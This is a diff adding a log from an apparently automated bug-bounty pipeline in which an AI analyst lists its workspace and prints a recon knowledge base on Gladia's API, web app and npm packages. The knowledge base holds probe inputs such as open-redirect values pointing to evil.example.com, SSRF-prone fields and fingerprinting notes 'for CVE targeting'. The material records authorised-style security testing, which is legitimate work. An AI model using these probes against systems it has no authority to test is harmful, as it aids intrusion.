@@ -9448,3 +9448,747 @@ testability: HUMAN_ONLY
 [RISK] app.gladia.io: 65 — /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.
 
 [RISK] sdk: 85 — Official @gladiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + README↔package.json "Official/Unofficial" contradiction; supply-chain risk High.
+===== ANALYST laguna 2026-08-08 17:52:29 UTC =====
+[0m
+> build · laguna-s-2.1-free
+[0m
+[0m$ [0mls -la /home/runner/work/gladia-hunt/gladia-hunt/
+total 208
+drwxr-xr-x 11 runner runner  4096 Aug  8 17:43 .
+drwxr-xr-x  3 runner runner  4096 Aug  8 17:42 ..
+drwxr-xr-x  7 runner runner  4096 Aug  8 17:43 .git
+drwxr-xr-x  3 runner runner  4096 Aug  8 17:43 .github
+-rw-r--r--  1 runner runner   156 Aug  8 17:43 README.md
+-rw-r--r--  1 runner runner    39 Aug  8 17:43 analyst-out.txt
+-rw-r--r--  1 runner runner 65354 Aug  8 17:43 analyst-prompt.txt
+-rw-r--r--  1 runner runner 62589 Aug  8 17:43 ctx.txt
+drwxr-xr-x  2 runner runner  4096 Aug  8 17:43 inventory
+drwxr-xr-x  2 runner runner  4096 Aug  8 17:43 knowledge
+drwxr-xr-x  2 runner runner  4096 Aug  8 17:43 leads
+-rw-r--r--  1 runner runner   426 Aug  8 17:43 probe-results.md
+drwxr-xr-x  2 runner runner  4096 Aug  8 17:43 reports
+drwxr-xr-x  4 runner runner  4096 Aug  8 17:43 reposcan-raw
+-rw-r--r--  1 runner runner  2187 Aug  8 17:43 scope.yml
+drwxr-xr-x  2 runner runner  4096 Aug  8 17:43 scripts
+-rw-r--r--  1 runner runner    33 Aug  8 17:43 state_bigpickle.json
+-rw-r--r--  1 runner runner    33 Aug  8 17:43 state_laguna.json
+-rw-r--r--  1 runner runner    33 Aug  8 17:43 state_ling3.json
+-rw-r--r--  1 runner runner    33 Aug  8 17:43 state_longcat.json
+-rw-r--r--  1 runner runner    33 Aug  8 17:43 state_nemotron3.json
+drwxr-xr-x  2 runner runner  4096 Aug  8 17:43 triage
+[0m
+[0m✱ [0mGlob "**/*.txt"[90m in . · 13 matches[0m
+[0m✱ [0mGlob "**/*.json"[90m in . · 7 matches[0m
+I'll analyze the current surface state and produce the structured hunting output. Let me first check the current state of the workspace.
+[0m
+[0m$ [0mcat /home/runner/work/gladia-hunt/gladia-hunt/state_laguna.json /home/runner/work/gladia-hunt/gladia-hunt/state_nemotron3.json /home/runner/work/gladia-hunt/gladia-hunt/state_bigpickle.json /home/runner/work/gladia-hunt/gladia-hunt/state_longcat.json /home/runner/work/gladia-hunt/gladia-hunt/state_ling3.json 2>/dev/null
+{"phase": "POC", "target": "app"}{"phase": "POC", "target": "app"}{"phase": "POC", "target": "api"}{"phase": "POC", "target": "sdk"}{"phase": "POC", "target": "api"}
+[0m
+[0m$ [0mls -la /home/runner/work/gladia-hunt/gladia-hunt/inventory/ /home/runner/work/gladia-hunt/gladia-hunt/leads/ /home/runner/work/gladia-hunt/gladia-hunt/reports/ /home/runner/work/gladia-hunt/gladia-hunt/triage/
+/home/runner/work/gladia-hunt/gladia-hunt/inventory/:
+total 24
+drwxr-xr-x  2 runner runner  4096 Aug  8 17:43 .
+drwxr-xr-x 11 runner runner  4096 Aug  8 17:43 ..
+-rw-r--r--  1 runner runner 15057 Aug  8 17:43 gladia.md
+
+/home/runner/work/gladia-hunt/gladia-hunt/leads/:
+total 1396
+drwxr-xr-x  2 runner runner   4096 Aug  8 17:43 .
+drwxr-xr-x 11 runner runner   4096 Aug  8 17:43 ..
+-rw-r--r--  1 runner runner 197820 Aug  8 17:43 lead-bigpickle.md
+-rw-r--r--  1 runner runner 205453 Aug  8 17:43 lead-laguna.md
+-rw-r--r--  1 runner runner   1407 Aug  8 17:43 lead-ling3.md
+-rw-r--r--  1 runner runner   1465 Aug  8 17:43 lead-longcat.md
+-rw-r--r--  1 runner runner 161465 Aug  8 17:43 lead-nemotron3.md
+-rw-r--r--  1 runner runner  28327 Aug  8 17:43 reposcan-2026-08-07-18-33.md
+-rw-r--r--  1 runner runner   8024 Aug  8 17:43 reposcan-2026-08-07-18-53.md
+-rw-r--r--  1 runner runner   8961 Aug  8 17:43 reposcan-2026-08-07-19-26.md
+-rw-r--r--  1 runner runner  78572 Aug  8 17:43 reposcan-2026-08-07-19-31.md
+-rw-r--r--  1 runner runner   9684 Aug  8 17:43 reposcan-2026-08-07-20-02.md
+-rw-r--r--  1 runner runner   9765 Aug  8 17:43 reposcan-2026-08-07-20-06.md
+-rw-r--r--  1 runner runner  75509 Aug  8 17:43 reposcan-2026-08-07-20-57.md
+-rw-r--r--  1 runner runner   9522 Aug  8 17:43 reposcan-2026-08-07-21-07.md
+-rw-r--r--  1 runner runner   6985 Aug  8 17:43 reposcan-2026-08-07-21-51.md
+-rw-r--r--  1 runner runner   7172 Aug  8 17:43 reposcan-2026-08-07-22-03.md
+-rw-r--r--  1 runner runner  12043 Aug  8 17:43 reposcan-2026-08-07-22-31.md
+-rw-r--r--  1 runner runner   8476 Aug  8 17:43 reposcan-2026-08-07-23-02.md
+-rw-r--r--  1 runner runner   7227 Aug  8 17:43 reposcan-2026-08-07-23-16.md
+-rw-r--r--  1 runner runner  28098 Aug  8 17:43 reposcan-2026-08-07-23-52.md
+-rw-r--r--  1 runner runner   7425 Aug  8 17:43 reposcan-2026-08-07-23-55.md
+-rw-r--r--  1 runner runner  12064 Aug  8 17:43 reposcan-2026-08-08-00-44.md
+-rw-r--r--  1 runner runner   7986 Aug  8 17:43 reposcan-2026-08-08-00-46.md
+-rw-r--r--  1 runner runner  27382 Aug  8 17:43 reposcan-2026-08-08-02-49.md
+-rw-r--r--  1 runner runner   8356 Aug  8 17:43 reposcan-2026-08-08-03-04.md
+-rw-r--r--  1 runner runner   7304 Aug  8 17:43 reposcan-2026-08-08-04-05.md
+-rw-r--r--  1 runner runner   8356 Aug  8 17:43 reposcan-2026-08-08-05-13.md
+-rw-r--r--  1 runner runner   8409 Aug  8 17:43 reposcan-2026-08-08-06-03.md
+-rw-r--r--  1 runner runner  14418 Aug  8 17:43 reposcan-2026-08-08-06-11.md
+-rw-r--r--  1 runner runner   8356 Aug  8 17:43 reposcan-2026-08-08-07-12.md
+-rw-r--r--  1 runner runner   8580 Aug  8 17:43 reposcan-2026-08-08-07-28.md
+-rw-r--r--  1 runner runner   8356 Aug  8 17:43 reposcan-2026-08-08-08-07.md
+-rw-r--r--  1 runner runner   8356 Aug  8 17:43 reposcan-2026-08-08-08-59.md
+-rw-r--r--  1 runner runner   7604 Aug  8 17:43 reposcan-2026-08-08-09-07.md
+-rw-r--r--  1 runner runner   8356 Aug  8 17:43 reposcan-2026-08-08-09-49.md
+-rw-r--r--  1 runner runner   7262 Aug  8 17:43 reposcan-2026-08-08-10-02.md
+-rw-r--r--  1 runner runner   8411 Aug  8 17:43 reposcan-2026-08-08-10-21.md
+-rw-r--r--  1 runner runner   9600 Aug  8 17:43 reposcan-2026-08-08-10-33.md
+-rw-r--r--  1 runner runner  27382 Aug  8 17:43 reposcan-2026-08-08-11-01.md
+-rw-r--r--  1 runner runner  10290 Aug  8 17:43 reposcan-2026-08-08-11-19.md
+-rw-r--r--  1 runner runner   8662 Aug  8 17:43 reposcan-2026-08-08-11-42.md
+-rw-r--r--  1 runner runner   8044 Aug  8 17:43 reposcan-2026-08-08-11-53.md
+-rw-r--r--  1 runner runner   6629 Aug  8 17:43 reposcan-2026-08-08-12-05.md
+-rw-r--r--  1 runner runner  27382 Aug  8 17:43 reposcan-2026-08-08-12-22.md
+-rw-r--r--  1 runner runner  27382 Aug  8 17:43 reposcan-2026-08-08-13-16.md
+-rw-r--r--  1 runner runner   9675 Aug  8 17:43 reposcan-2026-08-08-13-25.md
+-rw-r--r--  1 runner runner   8784 Aug  8 17:43 reposcan-2026-08-08-14-04.md
+-rw-r--r--  1 runner runner   5827 Aug  8 17:43 reposcan-2026-08-08-14-06.md
+-rw-r--r--  1 runner runner  27965 Aug  8 17:43 reposcan-2026-08-08-14-53.md
+-rw-r--r--  1 runner runner   7350 Aug  8 17:43 reposcan-2026-08-08-14-57.md
+-rw-r--r--  1 runner runner  30447 Aug  8 17:43 reposcan-2026-08-08-15-20.md
+-rw-r--r--  1 runner runner   9212 Aug  8 17:43 reposcan-2026-08-08-15-24.md
+-rw-r--r--  1 runner runner   6602 Aug  8 17:43 reposcan-2026-08-08-15-53.md
+-rw-r--r--  1 runner runner   7489 Aug  8 17:43 reposcan-2026-08-08-15-54.md
+-rw-r--r--  1 runner runner   7497 Aug  8 17:43 reposcan-2026-08-08-16-54.md
+-rw-r--r--  1 runner runner   8256 Aug  8 17:43 reposcan-2026-08-08-17-10.md
+-rw-r--r--  1 runner runner   7537 Aug  8 17:43 reposcan-2026-08-08-17-30.md
+-rw-r--r--  1 runner runner   7537 Aug  8 17:43 reposcan-latest.md
+
+/home/runner/work/gladia-hunt/gladia-hunt/reports/:
+total 2096
+drwxr-xr-x  2 runner runner   4096 Aug  8 17:43 .
+drwxr-xr-x 11 runner runner   4096 Aug  8 17:43 ..
+-rw-r--r--  1 runner runner 663998 Aug  8 17:43 analyst-bigpickle.log
+-rw-r--r--  1 runner runner 992441 Aug  8 17:43 analyst-laguna.log
+-rw-r--r--  1 runner runner   6048 Aug  8 17:43 analyst-ling3.log
+-rw-r--r--  1 runner runner   2520 Aug  8 17:43 analyst-longcat.log
+-rw-r--r--  1 runner runner 341381 Aug  8 17:43 analyst-nemotron3.log
+-rw-r--r--  1 runner runner   4055 Aug  8 17:43 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner   6667 Aug  8 17:43 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner     47 Aug  8 17:43 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner     49 Aug  8 17:43 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner   6378 Aug  8 17:43 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  80216 Aug  8 17:43 hypotheses.md
+-rw-r--r--  1 runner runner   6268 Aug  8 17:43 valid-bugs.md
+
+/home/runner/work/gladia-hunt/gladia-hunt/triage/:
+total 160
+drwxr-xr-x  2 runner runner  4096 Aug  8 17:43 .
+drwxr-xr-x 11 runner runner  4096 Aug  8 17:43 ..
+-rw-r--r--  1 runner runner   329 Aug  8 17:43 run-2026-08-07-19-18.md
+-rw-r--r--  1 runner runner 22882 Aug  8 17:43 run-2026-08-07-21-04.md
+-rw-r--r--  1 runner runner   299 Aug  8 17:43 run-2026-08-07-21-57.md
+-rw-r--r--  1 runner runner   315 Aug  8 17:43 run-2026-08-07-22-57.md
+-rw-r--r--  1 runner runner   241 Aug  8 17:43 run-2026-08-07-23-50.md
+-rw-r--r--  1 runner runner   467 Aug  8 17:43 run-2026-08-08-02-23.md
+-rw-r--r--  1 runner runner   437 Aug  8 17:43 run-2026-08-08-04-30.md
+-rw-r--r--  1 runner runner 14395 Aug  8 17:43 run-2026-08-08-06-01.md
+-rw-r--r--  1 runner runner 23300 Aug  8 17:43 run-2026-08-08-07-21.md
+-rw-r--r--  1 runner runner 17217 Aug  8 17:43 run-2026-08-08-09-05.md
+-rw-r--r--  1 runner runner  8395 Aug  8 17:43 run-2026-08-08-09-06.md
+-rw-r--r--  1 runner runner   430 Aug  8 17:43 run-2026-08-08-09-56.md
+-rw-r--r--  1 runner runner   245 Aug  8 17:43 run-2026-08-08-10-53.md
+-rw-r--r--  1 runner runner   268 Aug  8 17:43 run-2026-08-08-11-46.md
+-rw-r--r--  1 runner runner   294 Aug  8 17:43 run-2026-08-08-13-14.md
+-rw-r--r--  1 runner runner   389 Aug  8 17:43 run-2026-08-08-14-00.md
+-rw-r--r--  1 runner runner   292 Aug  8 17:43 run-2026-08-08-14-51.md
+-rw-r--r--  1 runner runner   284 Aug  8 17:43 run-2026-08-08-15-48.md
+-rw-r--r--  1 runner runner   326 Aug  8 17:43 run-2026-08-08-16-58.md
+[0m
+[0m→ [0mRead analyst-out.txt
+[0m→ [0mRead probe-results.md
+[0m→ [0mRead leads/lead-laguna.md[90m [limit=100][0m
+[0m→ [0mRead ctx.txt[90m [limit=50][0m
+Let me read the current lead state and context file to understand the latest findings.
+[0m→ [0mRead ctx.txt[90m [offset=300, limit=50][0m
+[0m→ [0mRead ctx.txt[90m [limit=50, offset=290][0m
+[0m→ [0mRead leads/lead-laguna.md[90m [limit=100, offset=1170][0m
+[0m→ [0mRead ctx.txt[90m [limit=60, offset=340][0m
+[0m→ [0mRead reports/hypotheses-laguna.txt
+Let me read the remaining context and the latest reports to get the complete picture.
+[0m→ [0mRead inventory/gladia.md[90m [limit=100][0m
+[0m→ [0mRead leads/reposcan-latest.md[90m [limit=80][0m
+[0m→ [0mRead reposcan-raw/analysis.txt
+[0m
+[0m$ [0mhead -100 /home/runner/work/gladia-hunt/gladia-hunt/reposcan-raw/rag.txt
+=== KNOWLEDGE BASE (RAG) ===
+# Knowledge Base (seed)
+
+## Program rules (from scope.yml)
+- In scope: api.gladia.io (Highest), app.gladia.io (High), official SDKs npm/PyPI (Medium), gladia.io (Low)
+- Out of scope: all other *.gladia.io subdomains, third parties, social engineering, physical, DoS, non-Gladia assets, physical access
+- Scanner output alone is REJECTED — every finding must be manually validated
+- Passive-first: GET/HEAD only, ≤1 rps, no account creation, no data modification
+- Secrets in commits: sha256 only, never raw
+
+## Baseline surface (2026-08-07 passive recon)
+- gladia.io -> 301 to www.gladia.io (Vercel, HSTS max-age=63072000, x-vercel-id)
+- api.gladia.io: 404 JSON on /, CORS access-control-allow-origin: *, exposes x-gladia-request-id, traceparent, tracestate, x-request-id, x-correlation-id; HSTS includeSubDomains preload; no WWW-Authenticate on 404
+- api.gladia.io/openapi.json: OpenAPI schema consumed by official SDK code generator (gladiaio/sdk packages/generator)
+- app.gladia.io: 302 -> /signin, sets __sid (expired) + return-to base64url JWT-ish cookie (eyJ1cmwiOiIvIn0%3D = {"url":"/"}), HttpOnly Secure SameSite=Lax, x-robots-tag noindex, HSTS preload
+- GitHub org gladiaio (19 public repos): sdk (monorepo: sdk-js, sdk-python, generator), gladia-cli (Go), docs (MDX), gladia-samples (Python), gladiaflow (Rust), realtime-multilingual-asr-router (Python), n8n-nodes-gladia, vercel-ai, compare-stt (TS), skills, gladia-quiz-app, normalization, triton-inference-memory-allocation, gunicorn-fix-sigabort, uvicorn-fix-sigabort, 1password-scim, vllm_backend, transformers, cloudnative-pg
+- npm: @gladiaio/sdk 1.1.0 (official, from gladiaio/sdk monorepo); `gladia` 0.1.3 claims "Official TypeScript SDK for Gladia" but repository = alexisbouchez/gladia.ts (PERSONAL account — flag, verify ownership)
+- PyPI: gladiaio-sdk (Python SDK, sync + async)
+
+## Rejected / parked
+- (none yet)
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: OpenAPI spec publicly exposed at /openapi.json with full v2 surface
+- 2026-08-07 ACCEPTED AUTH @ api.gladia.io: WebSocket auth uses token in URL query parameter per spec
+- 2026-08-07 ACCEPTED AUTH @ app.gladia.io: return-to cookie uses JWT-shaped base64url value without visible signature
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: Undocumented /health endpoint returns 200 (not in OpenAPI spec)
+- 2026-08-07 ACCEPTED AUTH @ api.gladia.io: WebSocket auth uses token in URL query parameter per OpenAPI spec
+- 2026-08-07 REJECTED AUTH @ app.gladia.io: return-to cookie tampering does not lead to open redirect (server validates/resets)
+- 2026-08-07 ACCEPTED OTHER @ npm registry: gladia@0.1.3 ownership anomaly (personal repo, unofficial maintainer) — requires affiliation verification
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: Undocumented /health endpoint returns 200 (not in OpenAPI spec)
+- 2026-08-07 ACCEPTED AUTH @ api.gladia.io: WebSocket auth uses token in URL query parameter per OpenAPI spec
+- 2026-08-07 REJECTED AUTH @ app.gladia.io: return-to cookie tampering does not lead to open redirect (server validates/resets)
+- 2026-08-07 ACCEPTED OTHER @ npm registry: gladia@0.1.3 ownership anomaly (personal repo, unofficial maintainer) — requires affiliation verification
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: `x-powered-by: Express` header present on CORS preflight (OPTIONS) responses only — confirms Node.js/Express.js backend; framework fingerprint for CVE targeting
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: /health?full=true does NOT leak verbose output — returns identical `{"health":"OK"}` to /health; no build/version/metadata disclosure via query params
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: /metrics endpoint does NOT exist — returns 404 (no Prometheus exposition endpoint)
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: /debug, /admin, /actuator/health, /v1 paths do NOT exist or return 404 — no Spring Boot Actuator, no debug panel, no catch-all admin
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: CORS preflight allows `Access-Control-Request-Headers: x-gladia-key` — auth header permitted in cross-origin requests (no credential support though)
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: /v2/live/init is NOT a real endpoint — confirmed 404 "Cannot POST"; WebSocket session is created via POST /v2/live, then client connects to returned `url` (wss://api.gladia.io/v2/live?token=<uuid>)
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: CORS wildcard reflects arbitrary origin — probe shows static `*` not Origin reflection
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: CORS preflight allows `x-gladia-key` header cross-origin (no credentials) — confirmed via OPTIONS probe
+- 2026-08-07 ACCEPTED AUTH @ app.gladia.io: redirect_to parameter reflected in signin form action — confirmed via GET probe
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: CORS GET responses return wildcard `*` not origin echo; expose-headers list trace/request-id headers; no allow-credentials → origin-reflection probe CLOSED, wildcard-without-credentials not exploitable
+- 2026-08-07 ACCEPTED OTHER @ npm registry: reposcan 20:02/20:06 flat (0 new hits, 5647 files) — gladia@0.1.3 anomaly remains sole reportable candidate; no new secrets
+- 2026-08-07 ACCEPTED AUTH @ api.gladia.io: /v1/history and /v2/upload confirmed key-gated (401) — no unauthenticated history/upload path
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: OpenAPI map stable at 14 paths (re-check 21:46Z) — no new endpoints since 20:55
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: 401 error body {statusCode,timestamp,path,message,request_id} is NestJS HttpException shape → backend is NestJS-on-Express, not plain Express
+- 2026-08-07 ACCEPTED OTHER @ npm registry: PyPI gladiaio-sdk latest 1.0.5; npm @gladiaio/sdk 1.1.0 unchanged — supply-chain surface static
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: live-probed /v2/transcription OPTIONS → `x-powered-by: Express` present; GET 401 → `x-powered-by` absent — confirmed preflight-only fingerprint differential (freshness 2026-08-07 21:46 UTC).
+- 2026-08-07 ACCEPTED OATH @ app.gladia.io: redirect_to reflected into form action for protocol-relative (`//evil`), bare-host, confusing-subdomain (`app.gladia.io.evil`), and path-only variants — no host allowlist enforced on reflection (post-auth honoring remains AUTH_HELPED/unverified).
+- 2026-08-07 CONFIRMED @ api.gladia.io: /openapi.json (200, 125KB, CORS *) publicly exposes full v2 surface incl. audio_url field accepted verbatim — confirms SSRF fetch-by-design path (freshly sampled).
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: OpenAPI /v1/history exposes OBJECT-typed custom_metadata query param with additionalProperties:true — complex query parsing surface for injection/testing
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: CallbackConfigDto.url lacks scheme allowlist/pattern at schema level — SSRF guard absent by design in spec
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: /v1/models public endpoint leaks datacenter regions (FR/US) and static pricing metadata — aids SSRF egress targeting
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: live-probed OPTIONS /v2/transcription → x-powered-by: Express present, ACAO:*, Access-Control-Allow-Headers: x-gladia-key (2026-08-07 22:22 UTC — surface unchanged from 21:46 UTC)
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: live-probed GET /v2/transcription → 401 no gladia key provided, x-powered-by absent (preflight-only fingerprint confirmed, 2026-08-07 22:22 UTC)
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: /openapi.json (200, 125KB, CORS *) exposes InitTranscriptionRequest.audio_url as format:uri with no scheme allowlist + deprecated callback_url + CallbackConfigDto.url (format:uri, no allowlist) — confirms SSRF-by-design surface
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: /health returns 200 {"health":"OK"}; /health?full=true returns identical payload — no verbose disclosure via query param (REJECTED as verbose-leak vector, ACCEPTED as undocumented endpoint)
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: /metrics (404), /debug (404), /admin (404), /actuator/health (404) — no Prometheus, no debug panel, no Spring Boot Actuator (all REJECTED, surface dead)
+- 2026-08-07 ACCEPTED AUTH @ api.gladia.io: POST /v2/live → 401 key-gated; POST /v2/live/init → 404 "Cannot POST" — WebSocket session created via POST /v2/live then wss://api.gladia.io/v2/live?token=<uuid>, no alternative init endpoint
+- 2026-08-07 ACCEPTED OATH @ app.gladia.io: live-probed /signin?redirect_to=https://evil.example.com → form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" — server-side reflection into POST form action (confirmed for protocol-relative //evil, bare-host, confusing-subdomain app.gladia.io.evil, path-only) — post-auth Location unverified (AUTH_HELPED)
+- 2026-08-07 REJECTED AUTH @ app.gladia.io: return-to cookie tampering does NOT lead to open redirect — server resets tampered value to {"url":"/"} (REJECTED as redirect vector, confirmed via prior + current probe)
+- 2026-08-07 ACCEPTED OTHER @ npm: gladia@0.1.3 registry metadata stable (description "Official TypeScript SDK", repo alexisbouchez/gladia.ts personal, maintainer softwarecitadel@gmail.com) — impersonation anomaly confirmed live 2026-08-07 22:22 UTC
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: 14 OpenAPI paths stable (no new endpoints since 21:46 UTC); /v1/models public (security: not set), all other v2 paths key-gated (401)
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: full surface re-probe 23:08Z byte-identical to 22:22Z (openapi 125131B/14 paths, /v1/models, /health, /v2/live 401, CORS, x-powered-by differential) — no drift, nothing new to report.
+- 2026-08-07 ACCEPTED OTHER @ npm: `gladia`@0.1.3 (softwarecitadel, alexisbouchez/gladia.ts) + @gladiaio/sdk 1.1.0 metadata static 23:08Z — supply-chain surface unchanged.
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: live spec still shows audio_url + CallbackConfigDto.url as `format:uri` with no scheme allowlist — SSRF-by-design fetch surface persists (re-verified 23:08Z).
+- 2026-08-07 ACCEPTED SSRF @ api.gladia.io: RAG of SDK source (packages/sdk-js/client.ts + packages/sdk-python/v2/prerecorded/core.py) confirms is_url()/uploadFile() only gates upload-vs-direct path; no host allowlist, metadata-blocklist, redirect-limit, or scheme validation forwarded to API for audio_url/video_url/callback_url — SSRF guard absent by design in SDK and spec.
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: live-probed OPTIONS /v2/pre-recorded → x-powered-by: Express present; POST → 401 x-powered-by absent — confirmed preflight-only fingerprint differential on second v2 endpoint (not isolated to /v2/transcription).
+- 2026-08-07 ACCEPTED AUTH @ api.gladia.io: POST /v2/pre-recorded with invalid key → 401 NestJS HttpException shape {statusCode,timestamp,path,message,request_id} — no x-powered-by leak on error response; uniform key-gated auth confirmed across v2 endpoints.
+- 2026-08-07 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com verified live 23:09 UTC — form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" server-side reflection persists; /apikeys and /transcriptions both 302→/signin with return-to cookie encoding their path ({'url':'/apikeys'}, {'url':'/transcriptions'}) — unsigned base64url JSON confirmed across multiple paths, server resets on tamper (REJECTED as cookie-tamper vector).
+- 2026-08-07 ACCEPTED OTHER @ npm: gladia@0.1.3 registry metadata stable 23:09 UTC (description="Official TypeScript SDK for Gladia", repo=alexisbouchez/gladia.ts personal, maintainer=softwarecitadel@gmail.com) — impersonation anomaly persists; @gladiaio/sdk@1.1.0 confirmed official from gladiaio org.
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: /v2/live/init confirmed 404 "Cannot POST" — not a real endpoint; WebSocket session created via POST /v2/live then wss://api.gladia.io/v2/live?token=<uuid> (no alternative init endpoint).
+- 2026-08-07 ACCEPTED MISCONFIG @ api.gladia.io: /openapi.json (200, CORS *) exposes video_url as plain string field with no format/scheme validation in /video/text/video-transcription multipart schema — second SSRF fetch surface confirmed alongside audio_url.
+- 2026-08-07 REJECTED MISCONFIG @ api.gladia.io: full surface re-probe 23:48Z byte-identical to 23:08Z (openapi 125131B/14 paths, /v1/models 530B, /health 15B, 401 gate, preflight x-powered-by differential) — no drift, nothing new to report.
+- 2026-08-07 ACCEPTED OTHER @ npm: `gladia`@0.1.3 (softwarecitadel, alexisbouchez/gladia.ts) + @gladiaio/sdk@1.1.0 metadata static 23:48Z — supply-chain surface unchanged.
+- 2026-08-07 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com form-action reflection re-confirmed 23:48Z — reflection surface persists, post-auth honoring still AUTH_HELPED.
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: /health returns 200 `{"health":"OK"}` (x-powered-by ABSENT on GET) — undocumented endpoint + preflight-only fingerprint confirmed fresh 23:5x UTC
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: OPTIONS /v2/transcription 204 `x-powered-by: Express` + ACAO `*` + allow `x-gladia-key`, POST 401 no`x-powered-by` — preflight-only fingerprint + creds-bypassable CORS confirmed fresh
+- 2026-08-08 ACCEPTED AUTH @ api.gladia.io: POST /v2/transcription (no key) → 401 — key-gated surface confirmed; @gladiaio/key header is the sole auth model
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: /openapi.json (200, 125131B, CORS `*`, expose-headers trace ids) + /v1/models (200 public CORS `*`) fully exposed — surface stable & fresh
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com → form action reflects URL-encoded value — reflection confirmed fresh 23:5x UTC
+- 2026-08-08 ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 text/html (SPA shell) without auth — client-side enforcement confirmed fresh
+- 2026-08-08 ACCEPTED OTHER @ npm: `gladia`@0.1.3 description "Official TypeScript SDK…", repo alexisbouchez/gladia.ts (personal), maintainer softwarecitadel@gmail.com — impersonation anomaly confirmed fresh 23:5x UTC
+- 2026-08-08 (no new REJECTED class this cycle; surface re-confirmed byte-identical to 23:08 per 23:48 prior re-probe — drift negative)
+- 2026-08-08 CONFIRMED OTHER @ npm gladia@0.1.3: artifact-level impersonation independently re-verified 02:50 UTC (tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2; package.json "Official" vs README "Unofficial"; author alexisbouchez/personal repo; src/client.ts:307 raw x-gladia-key appended to wss://.../v2/live? token query)
+- 2026-08-08 ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive 02:50 UTC across protocol-relative //evil, bare-host, app.gladia.io.evil confusing-subdomain, path-only — no host allowlist at unauthenticated layer (post-auth honoring still AUTH_HELPED)
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→23:48→00:44→02:50 UTC); openapi 125131B/14 paths, /health 15B, /v1/models 530B, x-powered-by Express on OPTIONS-only, CORS `*`+ACAH x-gladia-key — surface frozen, nothing new this cycle
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: preflight-only `x-powered-by: Express` fingerprint differential confirmed fresh 02:50 UTC (OPTIONS /v2/transcription 204 xpb=Express; POST 401 xpb absent) — not isolated to one endpoint
+- 2026-08-08 ACCEPTED SSRF @ api.gladia.io: spec/spec+RAG unchanged 02:50 UTC (audio_url/video_url/callback_url format:uri no scheme allowlist, no client-side guard) — SSRF-by-design fetch surface remains live, gated only by key AUTH_HELPED
+- 2026-08-08 ACCEPTED OTHER @ npm gladia@0.1.3: artifact-level impersonation independently re-verified 02:50 UTC (tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2; package.json "Official" vs README "Unofficial"; author alexisbouchez/personal repo; src/client.ts:307 raw x-gladia-key appended to wss://.../v2/live? token query)
+- 2026-08-08 REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→23:48→00:44→02:50→04:01 UTC); openapi 125131B/14 paths, /health 15B, /v1/models 530B, x-powered-by Express on OPTIONS-only, CORS `*`+ACAH x-gladia-key — surface frozen, no new endpoints
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: preflight-only `x-powered-by: Express` fingerprint differential confirmed fresh 04:01 UTC (OPTIONS /v2/transcription 204 xpb=Express; GET/POST 401 xpb absent) — confirmed not isolated to one endpoint
+- 2026-08-08 ACCEPTED MISCONFIG @ api.gladia.io: GET /v2/transcription (no key) → 401 NestJS HttpException shape confirmed fresh 04:01 UTC (timestamp 2026-08-08T04:01:14.742Z, request_id G-36290736) — uniform key-gated auth across v2 endpoints
